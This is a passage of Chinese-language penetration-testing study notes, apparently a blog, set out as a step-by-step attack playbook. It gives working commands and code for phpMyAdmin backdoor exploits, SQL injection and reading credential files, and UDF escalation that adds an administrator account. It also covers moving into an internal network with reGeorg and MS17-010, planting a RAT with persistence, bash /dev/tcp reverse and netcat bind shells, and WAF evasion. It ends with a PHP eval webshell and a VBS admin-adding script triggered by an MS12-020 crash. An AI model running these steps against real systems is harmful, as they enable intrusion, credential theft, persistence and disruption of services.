后门漏洞</p>\n<p>利用模块：exploit/multi/http/phpmyadmin_3522_backdoor</p>\n<p>CVE：CVE-2012-5159</p>\n<p>三、影响版本：2.11.x &lt; 2.11.9.5 and 3.x ❤️.1.3.1</p>\n<p>概述：phpmyadmin 配置文件 /config/config.inc.php 存在命令执行</p>\n<p>利用模块：exploit/unix/webapp/phpmyadmin_config</p>\n<p>CVE：CVE-2009-1151</p>\n<p>四、影响版本 2.11.3/2.11.4</p>\n<p>利用方法：用户名处写入 'localhost'@'@\" 登陆成功。(全部为英文标点符号，最后一个是双引号)</p>\n<p>php 爆绝对路径的办法：</p>\n<p>phpMyAdmin/libraries/select_lang.lib.php</p>\n<p>phpMyAdmin/darkblue_orange/layout.inc.php</p>\n<p>phpMyAdmin/index.php?lang=1</p>\n<p>phpMyAdmin/themes/darkblue_orange/layout.inc.php</p>\n<h3 id=\"sql-注入\"><a class=\"anchor\" href=\"#sql-注入\">#</a> SQL 注入</h3>\n<p>字符型，数字型，布尔盲注，时间盲注</p>\n<p>使用 sqlmap</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>--is-dba 判断当前用户是否为管理员</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>--privileges  判断当前用户名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>--password    当前数据库用户密码</pre></td></tr></tbody></table></figure><p>得到 hash 值，用弱密码爆破，或者用 cmd5 网址查询 (一般查不到)</p>\n<p>(啊 d) 工具</p>\n<p>尝试写文件，无权限，这里需要提权</p>\n<h3 id=\"获取-root-权限\"><a class=\"anchor\" href=\"#获取-root-权限\">#</a> 获取 root 权限</h3>\n<p>这里使用 mysql 的越权漏洞</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'dir\\\\MySQL\\\\data\\\\mysql\\\\user.MYD'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> admin <span class=\"token keyword\">fields</span> <span class=\"token keyword\">terminated</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\" LINES TERMINATED BY \"</span>\\<span class=\"token number\">0</span>'<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>而这 <code>dir</code>  的获取通过 <code>select @@basedir</code> ; 查看 mysql 的绝对路径，如（这里用 window 系统为例） <code>C:/Program Files/phpStudy/MySQL/</code></p>\n<p>那么使用漏洞的语句为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'C:\\\\Program Files\\\\phpStudy\\\\MySQL\\\\data\\\\mysql\\\\user.MYD'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> admin <span class=\"token keyword\">fields</span> <span class=\"token keyword\">terminated</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\" LINES TERMINATED BY \"</span>\\<span class=\"token number\">0</span>'<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>这样可以在表中可以看到 root 的用户名及密码</p>\n<p>在该环境中，密文的长度和字符范围均知，采用 cain 爆破</p>\n<p>爆破成功后，登陆 root 用户，那么就可以写一句话木马了</p>\n<p>但在此之前需要知道网站的根目录，这里利用信息搜集的 phpinfo.php 的网址，获取根目录</p>\n<p>获取根目录后，写文件，写一句话木马</p>\n<p>使用蚁剑 / 菜刀连接</p>\n<h3 id=\"udf-提权\"><a class=\"anchor\" href=\"#udf-提权\">#</a> UDF 提权</h3>\n<p>先上传 udf.php 和 gethash</p>\n<p>访问  <code>url/udf.php</code>  ，登陆 root 用户</p>\n<p>执行 shell 命令</p>\n<p><code>select shell(\"cmd\",'c:/gethash');</code></p>\n<p>根据提示</p>\n<p><code>select shell(\"cmd\",'c:/gethash -dhl');</code></p>\n<p>获取到 hash 值，之后用彩虹表进行爆破</p>\n<p>(或者使用以下 sql 语句)</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">function</span> cmdshell <span class=\"token keyword\">returns</span> string <span class=\"token keyword\">soname</span> <span class=\"token string\">'moonudf.dll'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">select</span> cmdshell<span class=\"token punctuation\">(</span><span class=\"token string\">'net user username password /add'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">select</span> cmdshell<span class=\"token punctuation\">(</span><span class=\"token string\">'net localgroup administrators username /add'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"25-从外网到内网主机远控-msf-sock-代理\"><a class=\"anchor\" href=\"#25-从外网到内网主机远控-msf-sock-代理\">#</a> 2.5 从外网到内网主机远控 msf sock 代理</h1>\n<p>两台外网攻击机（一台 kali，一台 windows）</p>\n<p>一个公司主机，双网卡，连接内网主机</p>\n<p>目的：上传 webshell，获取公司网站的权限，然后拿下内网主机</p>\n<p>使用工具：</p>\n<ul>\n<li>reGeorg + proxychains 代理进入内网</li>\n<li>利用 msf 获取 system 权限</li>\n<li>Powershell 下载并运行远控</li>\n</ul>\n<h2 id=\"上传-webshell\"><a class=\"anchor\" href=\"#上传-webshell\">#</a> 上传 webshell</h2>\n<p>上传成功后，蚁剑连接，进入虚拟终端，查看用户， <code>whoami</code> ，为 apache</p>\n<p>查看 php 库， <code>php -m</code>  发现有 <code>sockets</code> ，那么在上传 reGeorg 中的 tunnel.php 时，可以先删去， <code>dl(\"php_sockets.dll\");</code>  该行，防止报错</p>\n<h2 id=\"连接\"><a class=\"anchor\" href=\"#连接\">#</a> 连接</h2>\n<h3 id=\"kali-代理\"><a class=\"anchor\" href=\"#kali-代理\">#</a> kali 代理</h3>\n<p><code>python reGeorgSocksProxy.py -p port - u url</code></p>\n<p>扫描端口号</p>\n<p>由于不能访问内网，这里采用代理访问</p>\n<p><code>proxychains4 nmap -sT -Pn 内网ip(可通过webshell的ifconfig获取)</code></p>\n<p>由结果可以判断为 window 系统，由开放的 445 端口，判断存在 <code>MS17010</code>  漏洞，接下来开始 msf</p>\n<p><code>proxychains msfconsole</code>  或 <code>peoxychains -q msfconsole</code>  静默加载</p>\n<p>加载完后输入 <code>use exploit/windows/smb/ms17_010_psexec</code></p>\n<p>option</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_1.jpg\" alt=\"\"></p>\n<p>只需要填写 <code>rhost</code>  参数</p>\n<p><code>set rhost 内网ip</code></p>\n<p><code>run</code>  运行，进入 shell , 输入 <code>whoami</code> ，为 <code>system</code>  系统用户</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_2.jpg\" alt=\"\"></p>\n<h2 id=\"远控\"><a class=\"anchor\" href=\"#远控\">#</a> 远控</h2>\n<p>Quasar<a href=\"http://dpm12345.cn/2022/08/31/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%AD%A6%E4%B9%A0/\"> 链接</a></p>\n<p>在下图中的 <code>Connection to Hosts</code>  填入内网 ip，port 填入端口号，点击生成，将生成的.exe 文件上传至公司网站上，然后在内网利用 Powershell 下载该.exe 文件</p>\n<p><code>powershell client=new-object System.Net.WebClient:client=new−objectSystem.Net.WebClient:client.DownloadFile('url (外网主机 ip + 路径)',' 本地路径 ')</code></p>\n<p>下载成功后直接输入文件名即可运行</p>\n<p>这时回到 Quasar 的 Settings，开始监听之前设置的端口</p>\n<p>可以看到监听列表有一个，但由于不是由当前用户启动该.exe 程序，没有桌面画面，这时可以将该文件作为启动项，即可将该文件放入启动项文件夹中，如  <code>C:\\User\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code></p>\n<p>内网主机重启后可控制桌面</p>\n<h1 id=\"26-kali-linux-信息搜集\"><a class=\"anchor\" href=\"#26-kali-linux-信息搜集\">#</a> 2.6 kali linux 信息搜集</h1>\n<h2 id=\"dnsenum\"><a class=\"anchor\" href=\"#dnsenum\">#</a> Dnsenum</h2>\n<ul>\n<li><code>dnsenum [Options] &lt;domain&gt;</code></li>\n<li><code>--dnsserver</code>  指定 dns 服务器，并解析目标域名的 A，NS 和 MX 记录信息</li>\n<li><code>--enum</code>  (相当于是 <code>--threads5-s 15-w</code> ) 同时进行域名查询，并从 google 中查询目标域名的子域名 (此功能需要访问 google, 否则无法获取子域名)</li>\n<li><code>-O</code>  将查询结果以 xml 格式保存到某个文件中</li>\n</ul>\n<h2 id=\"dig\"><a class=\"anchor\" href=\"#dig\">#</a> Dig</h2>\n<ul>\n<li><code>dig [@global-server][domain] [q-type]</code>  可以指定 dns 服务器</li>\n<li>q-type 指定查询类型 (a, mx,ns,soa,hinfo,axfr,txt) ，默认只查询 A 记录</li>\n<li>-b 指定查询的源地址</li>\n<li>d-opt</li>\n<li>trace 显示域名解析过程</li>\n<li>short 显示精简的信息</li>\n<li>nssearch 显示授权的 dns 服务器信息</li>\n<li>类似工具：nslookup/hos</li>\n</ul>\n<h2 id=\"fierce\"><a class=\"anchor\" href=\"#fierce\">#</a> Fierce</h2>\n<ul>\n<li><code>Fierce [-dns example.com][OPTIONS]</code></li>\n<li>-dnsserver 指定 dns 服 务器</li>\n<li>-range 指定扫描的地址范围</li>\n<li>-file 指定输出的文件</li>\n<li>-wordlist 指定字典文件</li>\n</ul>\n<h2 id=\"dmitry\"><a class=\"anchor\" href=\"#dmitry\">#</a> Dmitry</h2>\n<ul>\n<li><code>dmitry [-winsepfb][-t 0-9] [-0 host.txt] host</code> -w whois 查询，通过域名查地址 i 参数正好相反</li>\n<li>-n 从 <span class=\"exturl\" data-url=\"aHR0cDovL25ldGNyYWZ0LmNvbQ==\">netcraft.com</span> 获取主机信息</li>\n<li>-s 查询子域名 (需要能够访问 google)</li>\n<li>-e 查询邮件地址</li>\n<li>-p 进行 tcp 端口扫描</li>\n<li>-t 指定端口扫描超时时间 (默认为 2s)</li>\n<li>-o 指定输出文件</li>\n<li>关于域名查询，也可以直接访问站长工具进行在线查询</li>\n</ul>\n<h2 id=\"recon-ng\"><a class=\"anchor\" href=\"#recon-ng\">#</a> Recon-ng</h2>\n<ul>\n<li>\n<p>是由 Python 编写的一个开源的 Web 侦查 (信息收集) 框架。</p>\n</li>\n<li>\n<p>4.9.2 版本， 支持 77 个侦查模块，8 个报告模块，2 个导入模块，2 个攻击模块，2 个发现模拟。</p>\n</li>\n<li>\n<p>search 模块</p>\n</li>\n<li>\n<p>use 模块</p>\n</li>\n<li>\n<p>showinfo 查看可设置的参数</p>\n</li>\n<li>\n<p>set 设置某项参数</p>\n</li>\n<li>\n<p>run</p>\n</li>\n<li>\n<p>Profiler 模块 interesting_ files 模块 shodan</p>\n</li>\n<li>\n<p>Workspaces 创建工作区 select 选择某个工作区</p>\n</li>\n<li>\n<p>Add hosts/netblocks/domains 在工作区下增加一些参数，适用于所有模块</p>\n</li>\n<li>\n<p>Set nameserver 在工作区下设置域名服务器，适用于所有模块</p>\n</li>\n<li>\n<p>Show hosts/netblocks/domain/ports 查看设置信息及获取信息</p>\n</li>\n<li>\n<p>search interesting_files 查找敏感信息</p>\n</li>\n<li>\n<p>search profiler 查找某个账号在知名网站的注册情况</p>\n</li>\n<li>\n<p>show profilers</p>\n</li>\n<li>\n<p>search shodan_hostname 查找某个域名相关的所有主机及其开放的端口信息</p>\n</li>\n<li>\n<p>先要设置 <code>key</code> ， <code>keys add shodan_api xxxxx</code></p>\n<p><code>show keys</code> , 可以看到设置的 key 值</p>\n<p><code>show ports</code>  展示信息</p>\n</li>\n<li>\n<p>输出信息 <code>use report</code></p>\n<p>report 形式， <code>search report</code></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng.jpg\" alt=\"\"></p>\n<p><code>show info</code></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng_1.jpg\" alt=\"\"></p>\n<p><code>set TABLE xxx</code>  设置格式</p>\n<p>之后  <code>run</code>  执行</p>\n</li>\n</ul>\n<h1 id=\"27-sql-注入\"><a class=\"anchor\" href=\"#27-sql-注入\">#</a> 2.7 SQL 注入</h1>\n<h2 id=\"mysql-的四种注释风格\"><a class=\"anchor\" href=\"#mysql-的四种注释风格\">#</a> mysql 的四种注释风格</h2>\n<ol>\n<li><code>#</code></li>\n<li><code>--</code></li>\n<li><code>/*...*/</code></li>\n<li><code>/*!...*/</code>  (内联注释)  <code>/*!50000*/</code>  (mysql 版本大于 50000 执行)</li>\n</ol>\n<h2 id=\"mysql-中常用的函数\"><a class=\"anchor\" href=\"#mysql-中常用的函数\">#</a> mysql 中常用的函数</h2>\n<ol>\n<li>\n<p><code>system__user()</code>  系统用户名</p>\n</li>\n<li>\n<p><code>user()</code>  用户名</p>\n</li>\n<li>\n<p><code>current user()</code>  当前用户名</p>\n</li>\n<li>\n<p><code>session_user()</code>  连接 $ 据库的用户名</p>\n</li>\n<li>\n<p><code>database()</code>  数据库名</p>\n</li>\n<li>\n<p><code>version()</code>  MYSQL 数 据库版本</p>\n</li>\n<li>\n<p><code>load_file()</code>  MYSQL 读取本地文件的函数</p>\n<p>操作前提:</p>\n<ul>\n<li>知道文件绝对路径</li>\n<li>能够使用 union 查询</li>\n<li>对 web 目录有写权限</li>\n</ul>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">' /etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token comment\"># .</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D://phpStudy//WWW//nvhack.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token number\">0x27443A2F2F70687053747564792F2F5757572F2F6E766861636B2E706870</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p><code>@@datadir</code>  读取数据库路径</p>\n</li>\n<li>\n<p><code>@@basedir</code> MYSQL 安装路径</p>\n</li>\n<li>\n<p><code>@@version_compile_os</code>  操作系统 Windows Server 2003</p>\n</li>\n<li>\n<p><code>into_outfile() / into outfile()</code></p>\n<ul>\n<li>前提:\n<ul>\n<li>文件名必须全路径 (绝对路径)，</li>\n<li>用户必须有写文件的权限</li>\n<li>没有对 ' 单引号过滤</li>\n</ul>\n</li>\n<li><code>SELECT'' into outfile 'D://phpStudy//WWW//hack.php'</code></li>\n</ul>\n</li>\n<li>\n<p><code>concat(str1,str2,...)</code></p>\n<p><code>concat_ws(separator,str1,str2,...)</code></p>\n<ul>\n<li>表示 concat with separator，即有分隔符的字符串连接，和 concat 类似，但可以直接确定字符串连接的分隔符 如 <code>concat_ws (0x23,\"test1\",\"test2\",\"test3\"), 得到 \"test1#test2#test3\"</code></li>\n</ul>\n<p>group_concat()</p>\n</li>\n</ol>\n<h2 id=\"使用内联注释绕过安全狗\"><a class=\"anchor\" href=\"#使用内联注释绕过安全狗\">#</a> 使用内联注释绕过安全狗</h2>\n<p>如 <code>?id=1 union select 1,2,3,4,5</code>  这样会被拦截</p>\n<p>将其改为 <code>?id=1 /*!50001union*/ /*!50001select*/ 1,2,3,4,5</code></p>\n<p>如果使用 <code>and</code> ，可将 <code>and</code>  修改为 <code>&amp;&amp;</code> ，即 <code>%26%26</code></p>\n<h1 id=\"28-内网转发基础\"><a class=\"anchor\" href=\"#28-内网转发基础\">#</a> 2.8 内网转发基础</h1>\n<p>使用 Socks 协议，由于不支持 SMT</p>\n<p>在 nmap 扫描时，需要有参数  <code>-Pn -sT</code></p>\n<h2 id=\"正向代理和反向代理\"><a class=\"anchor\" href=\"#正向代理和反向代理\">#</a> 正向代理和反向代理</h2>\n<p>** 正向代理：** 客户端主动向代理发送一个请求，然后代理向服务器转交请求并将获取的内容返回给客户端</p>\n<p>** 反向代理：** 一般是代理服务器主动将获取的资源流量转发到客户端，让客户端接收</p>\n<h2 id=\"netcatnc\"><a class=\"anchor\" href=\"#netcatnc\">#</a> NetCat/nc</h2>\n<h3 id=\"用法参数-简略\"><a class=\"anchor\" href=\"#用法参数-简略\">#</a> 用法参数 (简略)</h3>\n<p>-l 开启监听 -p 指定端口 -t 以 telnet 形式应答 -e 程序重定向</p>\n<p>-n 以数字形式表示 -vv 显示详细信息</p>\n<p><code>nc -v ip port</code>  探测 port 端口是否打开</p>\n<p><code>nc -vv ip port &lt; file_path</code>  提交指定文件内的数据包到 ip 的 port 端口</p>\n<h3 id=\"正向代理\"><a class=\"anchor\" href=\"#正向代理\">#</a> 正向代理</h3>\n<p><strong>代理端：</strong> <code>nc -l -p 111 -t -e cmd.exe</code></p>\n<p><strong>客户端</strong>： <code>nc -nvv ip port(111)</code></p>\n<h3 id=\"反向代理\"><a class=\"anchor\" href=\"#反向代理\">#</a> 反向代理</h3>\n<p><strong>客户端</strong>：  <code>nc -lvnp port</code></p>\n<p><strong>代理端：</strong>  <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>\n<h2 id=\"常用内网转发工具\"><a class=\"anchor\" href=\"#常用内网转发工具\">#</a> 常用内网转发工具</h2>\n<h3 id=\"netsh\"><a class=\"anchor\" href=\"#netsh\">#</a> netsh</h3>\n<p>netsh 是 Windows 自带的命令行脚本工具，它允许从本地或远程显示或修改当前正在运行的计算机的网络配置，它基于 Socket 协议，</p>\n<p>我们可以利用 netsh 进行端口转发</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>netsh interface portproxy add v4tov4 listenaddress = 客户端 ip (转发) listenport=666 (转发到的端口) connectaddress = 要转发的 ip (内网) connectport = 转发端口</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>查看转发</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>netsh interface portproxy show all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>删除</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port</pre></td></tr></tbody></table></figure><h3 id=\"lcx\"><a class=\"anchor\" href=\"#lcx\">#</a> Lcx</h3>\n<h4 id=\"正向转发\"><a class=\"anchor\" href=\"#正向转发\">#</a> 正向转发</h4>\n<p><code>lcx -tran port1 ip port2</code></p>\n<p>即将 ip 的端口 port2 转发到本机的端口 port1 上</p>\n<h4 id=\"反向转发\"><a class=\"anchor\" href=\"#反向转发\">#</a> 反向转发</h4>\n<p>** 代理端：**lcx -slave 转发到的 ip 转发到的端口 port 转发 ip 转发端口</p>\n<p><strong>本地</strong>：lcx listen 666 777</p>\n<p>将 666 端口接收到的流量转 777 端口</p>\n<p>本地访问 127.0.0.1:777（或者转为转发到的 ip）</p>\n<p>转 777 端口的原因：666 端口已经用来接收流量，不能访问，因此需要再转</p>\n<h3 id=\"ssock\"><a class=\"anchor\" href=\"#ssock\">#</a> sSock</h3>\n<h4 id=\"proxychains\"><a class=\"anchor\" href=\"#proxychains\">#</a> proxychains</h4>\n<p>Linux 下的代理工具，可以使任何程序通过代理上网 <code>/etc/proxychains.conf</code></p>\n<p>Windows 下可以用 Proxifier</p>\n<h4 id=\"sockscap64\"><a class=\"anchor\" href=\"#sockscap64\">#</a> sockscap64</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29ja3NjYXA2NC5jb20vemgtaGFucy9ob21lcGFnZS8=\">https://www.sockscap64.com/zh-hans/homepage/</span></p>\n<p>使用</p>\n<p><strong>客户端:</strong>  <code>./rcsocks -l 9999 -p 1080 -vv (9999 为本地提供服务 (访问) 端口)</code></p>\n<p><strong>代理端:</strong>  <code>./rssocks -vv -s 客户端 ip:1080</code></p>\n<h3 id=\"ew\"><a class=\"anchor\" href=\"#ew\">#</a> EW</h3>\n<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向”、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、 Windows.MacOS、Arm-Linux 均被包括其内，强烈推荐使用</p>\n<p><strong>Ew 正向代理</strong></p>\n<p>代理端（中间机，可以访问内网机器）:・ew.exe -S ssocksd -l 1080・</p>\n<p>客户端：设置代理服务器 IP，端口 1080</p>\n<p><strong>Ew 反向代理</strong></p>\n<ul>\n<li>\n<p>首先在攻击机执行命令:</p>\n<p><code>ew.exe -s rcsocks -| 888 -e 777</code></p>\n<p>意思是将物理机 888 端口的流量都转到本地端口 777_上。</p>\n</li>\n<li>\n<p>接着在在中间机（可以访问内网）中执行:</p>\n<p><code>ew.exe -s rssocks -d 192.168.11.248 (攻击机 ip) -e 777</code></p>\n<p>意思是将目标机的流量全部转到 192.168.11.248:777 端口</p>\n</li>\n<li>\n<p>最后在 sockscap64 中设置代理 127.0.0.1:888 端口即可 / 或者 proxychains 修改 proxychains.conf 配置文件</p>\n</li>\n</ul>\n<h3 id=\"regeorg\"><a class=\"anchor\" href=\"#regeorg\">#</a> reGeorg</h3>\n<p>web 代理工具</p>\n<p>基于 python，利用 PHP 创建的代理</p>\n<p>用于端口映射环境，流量只通过 http 传输</p>\n<ul>\n<li>\n<p>我们首先将 reGeorg 文件夹上传至肉鸡的网站目录下，然后访问对应脚本。</p>\n</li>\n<li>\n<p>192.1 68.20.128/r/tunnel.nosocket.php (或者也可以使用 tunnel.php)</p>\n</li>\n<li>\n<p>显示 Georg says, All seems fine 字样则代表成功。</p>\n</li>\n<li>\n<p>注意，工具目录下有各种脚本，网站是什么脚本，则访问对应脚本类型</p>\n</li>\n<li>\n<p>接下来在攻击机执行如下脚本 (需要 urlib3 模块) :</p>\n<p><code>python reGeorgSocksProxy.py -p 8888 -u http://192.168 .20.128/r/tunnel.nosocket.php</code></p>\n</li>\n<li>\n<p>最后设置 proxifier 代理为 127.0.0.1:8888，即可。</p>\n</li>\n</ul>\n<h1 id=\"29-综合渗透之溢出提权\"><a class=\"anchor\" href=\"#29-综合渗透之溢出提权\">#</a> 2.9 综合渗透之溢出提权</h1>\n<h2 id=\"写木马获取-webshell\"><a class=\"anchor\" href=\"#写木马获取-webshell\">#</a> 写木马获取 webshell</h2>\n<p>通过弱密码登陆 phpadmin，利用 <code>into outfile \"\"</code>  写一句话木马</p>\n<p>(或者创建表写入一句话木马)</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>mysql<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">.</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon1<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">TEXT</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>mysql<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">.</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon (<span class=\"token punctuation\">`</span></span>darkmoon1<span class=\"token identifier\"><span class=\"token punctuation\">`</span>) VALUES ('&lt;?php @eval($_POST[pass]);?&gt;');</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>SELECT <span class=\"token punctuation\">`</span>darkmoon1<span class=\"token identifier\"><span class=\"token punctuation\">`</span> FROM <span class=\"token punctuation\">`</span></span>darkmoon<span class=\"token identifier\"><span class=\"token punctuation\">`</span> INTO OUTFILE 'd:/phps tudy/www/test.php' ;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>DROP TABLE IF EXISTS <span class=\"token punctuation\">`</span>darkmoon<span class=\"token punctuation\">`</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">Create</span> <span class=\"token keyword\">TABLE</span> moon <span class=\"token punctuation\">(</span>darkmoon <span class=\"token keyword\">text</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">Insert</span> <span class=\"token keyword\">INTO</span> moon <span class=\"token punctuation\">(</span>darkmoon<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?php @eval($_POST[pass]);?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">select</span> darkmoon <span class=\"token keyword\">from</span> moon <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'d:/phpstudy/www/test.php'</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">Drop</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token keyword\">EXISTS</span> moon<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"利用脚本添加用户\"><a class=\"anchor\" href=\"#利用脚本添加用户\">#</a> 利用脚本添加用户</h2>\n<p>写入成功获取到 webshell 后，</p>\n<p>目的是登录目标服务器，所以需要获取当前用户密码或者添加账户</p>\n<p>这里的想法是尝试给目标服务器的启动目录写一个脚本，然后设法使其重启，运行脚本，获得权限</p>\n<p>user.vbs</p>\n<pre><code class=\"language-vbscript\">set wsnetwork=Create0bject (\"WSCRIPT.NEIWORK\")\nos=\"WinNT://\"&amp;wsnetwork.ComputerName\nSet ob=Get0bject(os)' 得到adsi接口,绑定\nSet oe=Get0bject(os&amp;\"/Administrators,group\")'属性, admin组\nSet od=ob.Create(\"user\", \"test\")'建立用户\nod.SetPassword 123456+abc*\" '设置密码\nod.SetInfo'保存\nSet of=Get0bject(os&amp;\"/test\" , user)'得到用户\noe.add os&amp;\"/test\"\n</code></pre>\n<p>先将该文件上传到网站的根目录 (这里为 <code>d:\\\\phpStudy\\\\WWW</code> ), 然后利用数据库的 root 权限侠士写文件到启动目录下</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:\\\\phpStudy\\\\WWW\\\\user.vbs'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'c:/docume~1/alluse~1/「开始」菜单/程序/启动/user.vbs'</span></pre></td></tr></tbody></table></figure><p>之后利用漏洞 MS12-020 使其蓝屏自动重启 (可使用 nessus 扫描漏洞)</p>\n<p><span class=\"exturl\" 